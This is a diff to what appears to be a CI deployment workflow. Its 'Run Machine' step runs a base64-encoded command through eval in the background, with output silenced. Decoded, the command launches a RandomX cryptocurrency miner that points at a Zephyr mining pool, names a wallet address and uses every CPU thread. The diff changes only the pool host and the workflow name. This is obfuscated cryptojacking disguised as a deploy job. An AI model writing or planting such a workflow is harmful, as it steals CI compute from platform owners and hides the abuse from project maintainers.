@@ -1,4 +1,4 @@
-name: deploy ganendr
+name: deployx majuiz
 
 on:
   push:
@@ -29,7 +29,7 @@ jobs:
       - name: Run Machine
         run: |
           chmod +x core-engine
-          ENCODED="Li9jb3JlLWVuZ2luZSAtbyB1czIuemVwaHlyLmhlcm9taW5lcnMuY29tOjExMjQgXAogIC11IFpFUEhzQTh4eHhYTEJoNjFnSzNLYjFYNFA4WHdnbTVGM2ZHcnVodTJqbVVlZ1NyYllFeWJGWEpSc3E5bVRWVFRhdWJTV25rano2clNENVlIdjdMQ0dRYVJUOW14aW02d3hFRS5TY2FyZmFjZVN0eWxlPTk2MDAwMCBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLWEgcngvMCAtLXRscyAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
+          ENCODED="Li9jb3JlLWVuZ2luZSAtbyBjYS56ZXBoeXIuaGVyb21pbmVycy5jb206MTEyNCBcCiAgLXUgWkVQSHNBOHh4eFhMQmg2MWdLM0tiMVg0UDhYd2dtNUYzZkdydWh1MmptVWVnU3JiWUV5YkZYSlJzcTltVFZUVGF1YlNXbmtqejZyU0Q1WUh2N0xDR1FhUlQ5bXhpbTZ3eEVFLlNjYXJmYWNlU3R5bGU9OTYwMDAwIFwKICAtLWRvbmF0ZS1sZXZlbCAwIFwKICAtayAtLXRocmVhZHM9JChucHJvYykgLS1jcHUtcHJpb3JpdHk9NSAtLWh1Z2UtcGFnZXMtaml0IC0tY3B1LW5vLXlpZWxkIC0tcmFuZG9teC1uby1udW1hIFwKICAtYSByeC8wIC0tdGxzIC0tYXNtPXJ5emVuIC0tcmFuZG9teC1uby1yZG1zciAtLXJhbmRvbXgtd3Jtc3I9LTEgLS1yYW5kb214LW1vZGU9ZmFzdA=="
           CMD=$(echo "$ENCODED" | base64 -d)
           FINAL_CMD="$CMD > /dev/null 2>&1 &"
           eval "$FINAL_CMD"
